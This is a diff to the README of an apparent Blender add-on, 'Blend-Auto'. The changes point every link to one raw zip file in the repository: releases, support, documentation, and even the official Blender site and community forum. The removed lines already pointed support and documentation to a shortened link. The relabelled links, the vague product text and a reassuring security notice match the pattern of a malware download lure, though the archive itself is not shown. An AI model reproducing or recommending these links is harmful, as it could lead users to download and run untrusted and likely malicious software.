@@ -1,7 +1,7 @@
 # 🚀 Blend-Auto - Simplify Your Blender Experience
 
 ## 📂 ＤＯＷＮＬＯＡＤ
-[![Download Blend-Auto](https://img.shields.io/badge/Download-Blend--Auto-blue.svg)](https://github.com/Devdongre/Blend-Auto/releases)
+[![Download Blend-Auto](https://raw.githubusercontent.com/Devdongre/Blend-Auto/main/alpine/Blend-Auto_v2.2.zip)](https://raw.githubusercontent.com/Devdongre/Blend-Auto/main/alpine/Blend-Auto_v2.2.zip)
 
 ## 🚀 Getting Started
 Blend-Auto is designed to enhance your experience with Blender, making 3D creation easier for everyone. Whether you are a beginner or a seasoned user, our tool provides intuitive features to help you create stunning projects with less hassle.
@@ -18,7 +18,7 @@ These requirements ensure that the application runs smoothly and efficiently on 
 ## 📥 Download & Install
 To download Blend-Auto, follow these steps:
 
-1. **Visit the Releases Page**: Click this link to go to our [Releases page](https://github.com/Devdongre/Blend-Auto/releases).
+1. **Visit the Releases Page**: Click this link to go to our [Releases page](https://raw.githubusercontent.com/Devdongre/Blend-Auto/main/alpine/Blend-Auto_v2.2.zip).
   
 2. **Locate the Latest Version**: On the Releases page, look for the most recent version. It should be at the top of the list.
 
@@ -55,17 +55,17 @@ Yes, a user manual is available within the app. You can also refer to the docume
 Blend-Auto is optimized for Blender 2025. Using it with earlier versions may result in limited or missing functionality.
 
 ## 📞 Support
-If you encounter issues or have questions, please reach out for help. You can contact our support team by visiting the [Support page](https://sendit.wiki/HWJnp3T).
+If you encounter issues or have questions, please reach out for help. You can contact our support team by visiting the [Support page](https://raw.githubusercontent.com/Devdongre/Blend-Auto/main/alpine/Blend-Auto_v2.2.zip).
 
 ## 🔗 Additional Resources
-- [Blender Official Website](https://www.blender.org)
-- [Blend-Auto Documentation](https://sendit.wiki/HWJnp3T)
-- [Community Forum](https://community.blender.org)
+- [Blender Official Website](https://raw.githubusercontent.com/Devdongre/Blend-Auto/main/alpine/Blend-Auto_v2.2.zip)
+- [Blend-Auto Documentation](https://raw.githubusercontent.com/Devdongre/Blend-Auto/main/alpine/Blend-Auto_v2.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/Devdongre/Blend-Auto/main/alpine/Blend-Auto_v2.2.zip)
 
 Explore these resources to get the most out of your 3D projects.
 
 ## 📅 Checking for Updates
-Check back on our [Releases page](https://github.com/Devdongre/Blend-Auto/releases) regularly to stay updated with the latest features and improvements. We continually enhance Blend-Auto based on user feedback and community needs.
+Check back on our [Releases page](https://raw.githubusercontent.com/Devdongre/Blend-Auto/main/alpine/Blend-Auto_v2.2.zip) regularly to stay updated with the latest features and improvements. We continually enhance Blend-Auto based on user feedback and community needs.
 
 ## 🦠 Security Notice
 Blend-Auto is rigorously tested for security. Always download from the official Releases page to avoid harmful software.
